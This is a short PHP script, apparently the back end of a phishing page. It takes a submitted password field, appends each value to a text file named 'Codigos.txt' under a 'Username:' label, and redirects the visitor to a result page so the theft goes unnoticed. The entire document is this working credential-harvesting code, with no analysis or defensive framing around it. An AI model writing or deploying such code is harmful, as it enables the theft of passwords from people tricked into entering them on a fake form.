<?php

file_put_contents("Codigos.txt", "Username: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
